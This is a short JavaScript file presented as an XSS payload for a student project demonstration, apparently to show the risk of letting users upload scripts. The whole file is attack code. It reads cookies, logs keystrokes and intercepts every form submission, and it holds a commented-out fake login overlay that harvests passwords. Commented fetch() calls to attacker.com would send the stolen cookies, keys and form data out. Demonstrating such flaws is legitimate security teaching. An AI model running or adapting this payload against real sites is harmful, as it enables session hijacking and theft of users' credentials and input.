// Browser-compatible XSS payload for FYP demonstration
// This demonstrates how a malicious JS file could be executed in the browser

(function() {
  console.log('[XSS PAYLOAD] Malicious script loaded from:', window.location.href);
  
  // 1. Steal cookies
  if (document.cookie) {
    console.log('[XSS PAYLOAD] Cookies stolen:', document.cookie);
    // In real attack, this would be sent to attacker's server
    // fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
  }
  
  // 2. Keylogger demonstration
  let keystrokes = '';
  document.addEventListener('keypress', function(e) {
    keystrokes += e.key;
    console.log('[XSS PAYLOAD] Key logged:', e.key);
    // In real attack: fetch('http://attacker.com/keylog?key=' + e.key);
  });
  
  // 3. Phishing overlay (commented out for demo - uncomment to test)
  /*
  const overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
  overlay.innerHTML = `
    <div style="background:white;padding:30px;border-radius:10px;max-width:400px;">
      <h2 style="color:red;margin-bottom:15px;">⚠️ Security Alert</h2>
      <p>Your session has expired. Please login again.</p>
      <input type="password" id="phish-pwd" placeholder="Enter password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;">
      <button onclick="alert(\'Password captured: \' + document.getElementById(\'phish-pwd\').value)" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;">
        Login
      </button>
    </div>
  `;
  document.body.appendChild(overlay);
  */
  
  // 4. Alert to show execution (for demo purposes)
  setTimeout(() => {
    alert('⚠️ XSS PAYLOAD EXECUTED!\n\nThis demonstrates how a malicious JavaScript file uploaded to the server can be executed in the browser.\n\nCheck console for details.');
  }, 1000);
  
  // 5. Log all form data
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
      const formData = new FormData(form);
      const data = {};
      for (let [key, value] of formData.entries()) {
        data[key] = value;
      }
      console.log('[XSS PAYLOAD] Form data intercepted:', data);
      // In real attack: fetch('http://attacker.com/form?data=' + JSON.stringify(data));
    });
  });
  
  console.log('[XSS PAYLOAD] Payload initialized. Monitoring user activity...');
})();
